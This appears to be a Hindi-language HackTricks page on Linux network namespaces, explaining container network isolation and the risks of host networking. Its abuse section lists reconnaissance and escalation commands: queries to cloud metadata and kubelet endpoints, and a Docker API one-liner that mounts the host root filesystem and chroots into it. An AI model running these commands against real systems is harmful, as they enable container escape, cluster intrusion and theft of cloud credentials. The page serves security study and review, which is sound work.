# नेटवर्क नेमस्पेस

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

नेटवर्क नेमस्पेस उन नेटवर्क-संबंधी संसाधनों को अलग करता है जैसे कि interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, और `/proc/net` जैसी फाइलों की सामग्री। इसलिए एक container के पास ऐसा दिखने वाला अपना `eth0`, अपनी स्थानीय रूटिंग, और अपनी loopback device हो सकती है बिना host के वास्तविक नेटवर्क स्टैक का मालिक हुए।

सुरक्षा के लिहाज से, इसका मतलब यह है कि नेटवर्क आइसोलेशन सिर्फ port binding से कहीं अधिक है। एक private network namespace सीमित करता है कि workload सीधे क्या देख या reconfigure कर सकती है। एक बार जब वह namespace host के साथ साझा कर दिया जाता है, तो container अचानक host listeners, host-local services, और ऐसे नेटवर्क कंट्रोल पॉइंट्स को देख सकता/सकती है जिन्हें कभी application को एक्सपोज़ करने के लिए नहीं बनाया गया था।

## संचालन

नया बनाया गया network namespace तब तक एक खाली या लगभग खाली नेटवर्क वातावरण के साथ शुरू होता है जब तक कि interfaces उससे जुड़ न जाएँ। Container runtimes फिर virtual interfaces बनाते या कनेक्ट करते हैं, addresses असाइन करते हैं, और routes कॉन्फ़िगर करते हैं ताकि workload को अपेक्षित connectivity मिल सके। bridge-based deployments में, आमतौर पर इसका मतलब है कि container को एक veth-backed interface दिखता है जो host bridge से जुड़ा होता है। Kubernetes में, CNI plugins Pod networking के समकक्ष सेटअप को हैंडल करते हैं।

यह आर्किटेक्चर स्पष्ट करता है कि क्यों `--network=host` या `hostNetwork: true` इतना बड़ा बदलाव है। तैयार किए गए private network stack प्राप्त करने के बजाय, workload host के वास्तविक नेटवर्क स्टैक में जुड़ जाती है।

## लैब

आप लगभग खाली network namespace को निम्न के साथ देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप normal और host-networked कंटेनरों की तुलना इस तरह कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container अब अपना अलग isolated socket और interface view नहीं रखता। यह बदलाव ही पहले से ही महत्वपूर्ण है, इससे पहले कि आप यह पूछें कि process के पास कौनसी capabilities हैं।

## रनटाइम उपयोग

Docker और Podman आम तौर पर हर container के लिए एक private network namespace बनाते हैं जब तक कि अलग कॉन्फ़िगर न किया गया हो। Kubernetes आम तौर पर हर Pod को उसका अपना network namespace देता है, जिसे उस Pod के अंदर के containers साझा करते हैं लेकिन host से अलग रहता है। Incus/LXC systems भी network-namespace आधारित समृद्ध isolation प्रदान करते हैं, अक्सर विभिन्न प्रकार के virtual networking setups के साथ।

सामान्य सिद्धांत यह है कि private networking डिफ़ॉल्ट isolation boundary होती है, जबकि host networking उस सीमा से स्पष्ट opt-out होता है।

## गलत कॉन्फ़िगरेशन

सबसे महत्वपूर्ण misconfiguration सरलता से host network namespace साझा करना है। यह कभी-कभी performance, low-level monitoring, या convenience के लिए किया जाता है, लेकिन यह containers के लिए उपलब्ध सबसे साफ़ सीमाओं में से एक को हटा देता है। Host-local listeners अधिक सीधे पहुँच योग्य हो जाते हैं, localhost-only सेवाएँ पहुँच में आ सकती हैं, और `CAP_NET_ADMIN` या `CAP_NET_RAW` जैसी capabilities बहुत ज्यादा खतरनाक हो जाती हैं क्योंकि अब उनके द्वारा सक्षम किए गए ऑपरेशन host के अपने network environment पर लागू होते हैं।

एक और समस्या यह है कि network-related capabilities को ज़रूरत से अधिक दे देना, भले ही network namespace private हो। एक private namespace मदद करता है, लेकिन यह raw sockets या advanced network control को harmless नहीं बनाता है।

## दुरुपयोग

कमज़ोर तरीके से isolated सेटअप में, attackers host के listening services का निरीक्षण कर सकते हैं, केवल loopback से बंधे management endpoints तक पहुँच सकते हैं, traffic को sniff या interfere कर सकते हैं (exact capabilities और environment पर निर्भर करता है), या यदि `CAP_NET_ADMIN` मौजूद है तो routing और firewall स्थिति को reconfigure कर सकते हैं। एक cluster में, यह lateral movement और control-plane reconnaissance को भी आसान बना सकता है।

यदि आप host networking का संदेह करते हैं, तो शुरू करें यह सत्यापित करने से कि दिखाई देने वाले interfaces और listeners किसी isolated container network के बजाय host के हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only सेवाएँ अक्सर पहली दिलचस्प खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
यदि network क्षमताएँ मौजूद हैं, तो जाँच करें कि workload दृश्य stack का निरीक्षण या संशोधन कर सकता है या नहीं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
cluster या cloud environments में, host networking भी metadata और control-plane-adjacent services की त्वरित स्थानीय recon को जायज़ ठहराती है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### पूर्ण उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking स्वतः ही host root प्रदान नहीं करता, लेकिन यह अक्सर उन सेवाओं को एक्सपोज़ करता है जो जानबूझकर केवल node से ही पहुँचने योग्य होती हैं। यदि उन सेवाओं में से किसी एक की सुरक्षा कमजोर है, तो host networking एक सीधा privilege-escalation मार्ग बन जाता है।

Docker API localhost पर:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet localhost पर:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- सीधे होस्ट का समझौता हो सकता है यदि स्थानीय runtime API बिना उचित सुरक्षा के उपलब्ध हो
- यदि kubelet या स्थानीय agents पहुँच योग्य हों तो cluster reconnaissance या lateral movement हो सकता है
- `CAP_NET_ADMIN` के साथ मिलकर traffic manipulation या denial of service हो सकता है

## जाँच

इन जाँचों का उद्देश्य यह जानना है कि प्रक्रिया के पास private network stack है या नहीं, कौन से routes और listeners दिखाई दे रहे हैं, और क्या नेटवर्क दृश्य पहले से ही host जैसा दिखता है इससे पहले कि आप capabilities का परीक्षण भी करें।
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
What is interesting here:

- यदि namespace identifier या दिखाई देने वाला interface सेट host जैसा दिखता है, तो host networking पहले से ही उपयोग में हो सकता है।
- `ss -lntup` विशेष रूप से उपयोगी है क्योंकि यह loopback-only listeners और local management endpoints को प्रकट करता है।
- Routes, interface names, और firewall context बहुत अधिक महत्वपूर्ण हो जाते हैं यदि `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद हैं।

जब किसी container की समीक्षा कर रहे हों, तो हमेशा network namespace को capability set के साथ मिलाकर मूल्यांकन करें। Host networking और मजबूत network capabilities वाली स्थिति, bridge networking और संकुचित default capability set वाली स्थिति से बहुत अलग है।
